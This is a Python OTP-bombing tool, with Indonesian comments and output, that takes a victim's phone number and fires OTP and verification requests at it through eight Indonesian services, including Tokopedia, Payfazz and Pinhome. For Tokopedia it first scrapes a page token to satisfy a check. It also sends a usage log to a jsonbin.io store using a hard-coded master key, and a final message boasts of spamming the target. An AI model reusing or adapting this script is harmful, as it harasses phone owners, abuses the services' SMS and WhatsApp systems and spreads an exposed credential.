#!/usr/bin/env python3

import os
import sys
import json
import signal
import re
import random
import time
import string
import subprocess
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==========================================
# 1. DEKLARASI WARNA & DEKORASI MAHKOTA SEPUH
# ==========================================
a = "\033[1;30m"
m = "\033[1;31m"
h = "\033[1;32m"
k = "\033[1;33m"
c = "\033[1;36m"
p = "\033[1;37m"
r = "\033[0m"

BANNER = f"""
{c}██   ██ ██  █████  ██████   ██████  ██    ██ ████████ 
{c} ██ ██  ██ ██   ██ ██   ██ ██    ██ ██    ██      ██  
{c}  ███   ██ ███████ ██████  ██    ██ ██    ██     ██   
{c} ██ ██  ██ ██   ██ ██   ██ ██    ██ ██    ██    ██    
{c}██   ██ ██ ██   ██ ██   ██  ██████   ██████    ██     

{k}                █           █           █
{k}               ███         ███         ███
{k}              █████       █████       █████
{k}             ███████     ███████     ███████
{k}             ███████████████████████████████
{k}             ████ ▀████▀ █████ ▀████▀ ██████
{k}             ████▄▄████▄▄█████▄▄████▄▄██████
{k}             ███████████████████████████████
{k}             ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
{p}               ─── [ PRIVACY KING v2.0 ] ───
"""

APIKEY_BIN = "$2a$10$PC/h7AE2V10cjl.8TuhWQuSgEktrr2q1SJg7eoex44OMKXGLF9aO2"
BIN_ID = "6a4a27c4da38895dfe304f6e"
URL_BIN = f"https://api.jsonbin.io/v3/b/{BIN_ID}"

# ==========================================
# 2. FUNGSI BACKSOUND MUSIK
# ==========================================
def putar_musik_background():
    try:
        subprocess.Popen(
            ["mpv", "--no-video", "--loop", "musik.mp3"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
    except:
        pass

def matikan_musik():
    try:
        os.system("pkill mpv")
    except:
        pass

# ==========================================
# 3. FUNGSI TAMPILAN & LOG
# ==========================================
def animasi_loading(durasi=1.5):
    for i in range(21):
        bar = "█" * i + "-" * (20 - i)
        sys.stdout.write(f"\r{c}[*] Sabar boss : {k}[{bar}] {i*5}%")
        sys.stdout.flush()
        time.sleep(durasi / 20)
    print(f"\n{h}[+] Gas anj!")

def kirim_log_ke_server_gua():
    headers = {"X-Master-Key": APIKEY_BIN, "Content-Type": "application/json"}
    try:
        response = requests.put(URL_BIN, json={"log_pengujian": {"device": "User_Ganteng", "waktu": time.strftime("%H:%M:%S")}}, headers=headers, timeout=5)
        if response.status_code == 200:
            print(f"{h}[+] Xiarou baik!")
    except:
        pass

# ==========================================
# 4. DAFTAR API TARGET (DENGAN RETURN STATUS)
# ==========================================
def spam_otp_ktbs(nomor):
    try:
        nomor_clean = nomor[1:] if nomor.startswith("0") else (nomor[2:] if nomor.startswith("62") else nomor)
        url = f'https://core.ktbs.io/v2/user/registration/otp/62{nomor_clean}'
        return requests.get(url, timeout=5).status_code == 200
    except: return False

def spam_otp_payfaz(nomor):
    try:
        url = "https://api.payfazz.com/v2/phoneVerifications"
        return requests.post(url, data={"phone": nomor}, timeout=5).status_code < 400
    except: return False

def spam_otp_battlefront(nomor):
    try:
        nomor_clean = nomor[1:] if nomor.startswith("0") else (nomor[2:] if nomor.startswith("62") else nomor)
        url = "https://battlefront.danacepat.com/v1/auth/common/phone/send-code"
        return requests.post(url, data={'mobile_no': nomor_clean}, timeout=5).status_code == 200
    except: return False

def spam_otp_adiraku(nomor):
    try:
        nomor_lokal = "0" + nomor[2:] if nomor.startswith("62") else nomor
        url = "https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata"
        resp = requests.post(url, json={"mobileNumber": nomor_lokal, "type": "prospect-create", "channel": "whatsapp"}, timeout=5)
        return "success" in resp.text
    except: return False

def spam_otp_tokopedia(nomor):
    try:
        url_token = f"https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn={nomor}"
        resp = requests.get(url_token, timeout=5)
        token = re.search(r'<input\s+id="Token"\s+value="([^"]+)"', resp.text)
        if not token: return False
        url_otp = "https://accounts.tokopedia.com/otp/c/ajax/request-wa"
        resp2 = requests.post(url_otp, data={"otp_type": "116", "msisdn": nomor, "tk": token.group(1), "number_otp_digit": "6"}, timeout=5)
        return resp2.status_code == 200
    except: return False

def spam_otp_singa(nomor):
    try:
        url = "https://api102.singa.id/new/login/sendWaOtp"
        res = requests.post(url, json={"mobile_phone": nomor, "type": "mobile", "is_switchable": 1}, timeout=5)
        return "Success" in res.text
    except: return False

def spam_otp_pinhome(nomor):
    try:
        nomor_lokal = "0" + nomor[2:] if nomor.startswith("62") else nomor
        url = "https://www.pinhome.id/api/pinaccount/request/otp"
        payload = {"accountType": "customers", "countryCode": "62", "medium": "whatsapp", "otpType": "register", "phoneNumber": nomor_lokal}
        return requests.post(url, json=payload, timeout=5).status_code < 400
    except: return False

def spam_otp_duniagames(nomor):
    try:
        nomor_clean = nomor[1:] if nomor.startswith("0") else (nomor[2:] if nomor.startswith("62") else nomor)
        url = "https://api.duniagames.co.id/api/user/api/v2/user/send-otp"
        payload = {"phoneNumber": f"+62{nomor_clean}", "userName": f"0{nomor_clean}"}
        return requests.post(url, json=payload, timeout=5).status_code == 200
    except: return False

# ==========================================
# 5. ENGINE BERURUTAN (Biar Kelihatan Semua Prosesnya)
# ==========================================
def jalankan_semua_api(nomor):
    apis = {
        "Tokopedia OTP": spam_otp_tokopedia,
        "Adiraku WA": spam_otp_adiraku,
        "Singa ID": spam_otp_singa,
        "Pinhome Sistem": spam_otp_pinhome,
        "Dunia Games": spam_otp_duniagames,
        "Kitabisa API": spam_otp_ktbs,
        "Payfazz Secure": spam_otp_payfaz,
        "Battlefront": spam_otp_battlefront
    }
    
    print(f"\n{c}[*] GASSS CUKKK ...")
    for nama, fungsi in apis.items():
        sys.stdout.write(f"{p}[->] Menghubungi gerbang {nama}... ")
        sys.stdout.flush()
        
        status = fungsi(nomor)
        if status:
            print(f"{h}[BERHASIL NULIS LOG]")
        else:
            print(f"{m}[GAGAL RESPONS]")
        time.sleep(0.4) # Jeda dikit biar teksnya kelihatan jalan bergantian

# ==========================================
# 6. RUNNER UTAMA
# ==========================================
if __name__ == "__main__":
    try:
        os.system('clear')
        putar_musik_background()
        print(BANNER)
        
        jam_sekarang = time.strftime("%H:%M:%S")
        tanggal_sekarang = time.strftime("%d-%m-%Y")
        
        print(f"{k}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
        print(f"{k}┃ {p}WAKTU AKSES     : {c}{jam_sekarang} WIB ({tanggal_sekarang})       {k}┃")
        print(f"{k}┃ {p}PERANGKAT: {h}Nokia 3310 Pro Max                 {k}┃")
        print(f"{k}┃ {p}IP PROXY VIRTUAL: {h}127.0.0.1                            {k}┃")
        print(f"{k}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n")
        
        animasi_loading(1.5)
        print("")
        kirim_log_ke_server_gua()
        
        target = input(f"\n{c}Masukkan Nomor Target (contoh: 0812xxx): {r}")
        if target:
            jalankan_semua_api(target)
            print(f"\n{h}[+] Udah gua spam sial ke {target}!")
            mati
        else:
            print(f"{m}[-] Nomor tidak boleh kosong!")
            matikan_musik()
            
    except KeyboardInterrupt:
        matikan_musik()
        print(f"\n{m}[-] Keluar dari skrip.")
